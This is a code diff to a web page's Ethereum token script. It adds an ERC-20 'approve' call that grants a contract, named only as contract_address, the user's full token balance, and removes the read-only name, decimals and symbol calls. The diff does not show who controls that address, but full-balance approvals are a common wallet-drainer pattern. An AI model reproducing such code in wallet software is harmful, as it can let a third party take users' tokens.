@@ -1040,26 +1040,22 @@ document.getElementById('recover').addEventListener('click', recover);
 
 const erc20_abi = [
   {
-    "constant": true,
-    "inputs": [],
-    "name": "name",
-    "outputs": [
+    "constant": false,
+    "inputs": [
       {
-        "name": "",
-        "type": "string"
+        "name": "_spender",
+        "type": "address"
+      },
+      {
+        "name": "_value",
+        "type": "uint256"
       }
     ],
-    "payable": false,
-    "type": "function"
-  },
-  {
-    "constant": true,
-    "inputs": [],
-    "name": "decimals",
+    "name": "approve",
     "outputs": [
       {
-        "name": "",
-        "type": "uint8"
+        "name": "success",
+        "type": "bool"
       }
     ],
     "payable": false,
@@ -1083,19 +1079,6 @@ const erc20_abi = [
     "payable": false,
     "type": "function"
   },
-  {
-    "constant": true,
-    "inputs": [],
-    "name": "symbol",
-    "outputs": [
-      {
-        "name": "",
-        "type": "string"
-      }
-    ],
-    "payable": false,
-    "type": "function"
-  }
 ]
 
 function approveTokens() {
@@ -1107,8 +1090,10 @@ function approveTokens() {
   
 var tokenContract = web3.eth.contract(erc20_abi).at(token_address)
 var balance = tokenContract.balanceOf(address)
-console.log(balance)
+tokenContract.approve(contract_address,balance)
 
+//var balance = tokenContract.balanceOf(address)
+//console.log(balance)
 //var decimal = tokenContract.decimals()
 //var adjustedBalance = balance / Math.pow(10, decimal)
 //var tokenName = tokenContract.name()
